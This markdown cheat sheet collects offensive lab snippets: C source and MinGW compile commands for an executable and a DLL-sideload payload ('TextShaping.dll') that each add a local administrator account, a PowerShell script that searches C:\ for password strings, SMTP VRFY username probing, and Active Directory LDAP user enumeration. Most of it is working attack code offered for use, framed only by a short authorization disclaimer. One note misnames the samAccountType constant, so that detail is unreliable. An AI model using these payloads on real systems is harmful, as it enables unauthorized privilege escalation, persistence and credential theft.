# Mixed payloads and enumeration snippets

Reference snippets for **authorized** testing: local admin user creation (lab binaries), script content review, SMTP `VRFY`, and lightweight **Active Directory** LDAP queries from PowerShell.

---

## Binary payload — add local admin (`adduser.exe`)

### Compile (MinGW cross-compile from Linux)

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

**Purpose:** produce a Windows **x64** executable. After execution on a target (e.g. via lateral movement), it runs `net user` / `net localgroup` to add a user and grant **Administrators** membership.

**QC:** Replace usernames/passwords. These commands require **elevated** rights on the Windows host to succeed.

### Source (`adduser.c`)

```c
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");

  return 0;
}
```

---

## DLL payload — `DllMain` (`TextShaping.dll`)

### Compile as DLL

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

**Purpose:** `DllMain` runs on `DLL_PROCESS_ATTACH` when the DLL is loaded into a process—useful only in **controlled** DLL sideload / hijack labs.

### Source (`TextShaping.cpp`)

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved )
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("net user dave3 password123! /add");
            i = system ("net localgroup administrators dave3 /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

---

## PowerShell — search scripts for credential patterns

### Script: `Search-ScriptsForPasswords.ps1`

```powershell
# Recursively search script extensions on C:\ for common secret keywords
$OutputFile = "C:\Users\alex\password_search_results.txt"
Write-Host "Searching for password-related strings..." -ForegroundColor Green

Get-ChildItem -Path C:\ -Recurse -Include *.ps1, *.bat, *.cmd, *.vbs -ErrorAction SilentlyContinue -Force |
    Select-String -Pattern "password|credential|secret" -AllMatches |
    ForEach-Object {
        "{0}:{1} {2}" -f $_.Path, $_.LineNumber, $_.Line
    } | Out-File -FilePath $OutputFile -Encoding UTF8

Write-Host "Search completed. Results saved to: $OutputFile" -ForegroundColor Cyan
```

**Notes:**

- `-ErrorAction SilentlyContinue` skips permission errors on protected paths.
- Output is **path:lineNumber:line** for quick triage in a text editor.

---

## Python — SMTP `VRFY` helper

### Usage

```bash
python3 smtp.py root 192.168.50.8
```

| Argument | Role |
|----------|------|
| `root` | Username string sent in `VRFY` |
| `192.168.50.8` | SMTP server IP |

**QC:** Many servers disable `VRFY` or return misleading codes; interpret results with **manual** `telnet`/`openssl s_client` tests.

---

## PowerShell — PDC and LDAP root path

### Resolve PDC and build `LDAP://` base

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

**Purpose:** `PdcRoleOwner` is the **primary domain controller** FQDN; `distinguishedName` from rootDSE gives the **default naming context** for LDAP binds from a domain-joined host.

---

## PowerShell — enumerate user objects (`samAccountType`)

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"

$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```

**Note:** `805306368` = **normal user** accounts (`ADS_UF_NORMAL_ACCOUNT`). Adjust filter for groups, computers, etc., per LDAP query documentation.

---

## Summary

| Snippet | Use case |
|---------|----------|
| `adduser.exe` / `TextShaping.dll` | Demonstration of local account creation (lab only) |
| `Search-ScriptsForPasswords.ps1` | Hunt cleartext or weak patterns in script files |
| `smtp.py` | SMTP username probing via `VRFY` |
| AD PowerShell | Resolve PDC and sample user objects over LDAP |

Use only where you have **explicit authorization** (lab range, written rules of engagement, or owned infrastructure).
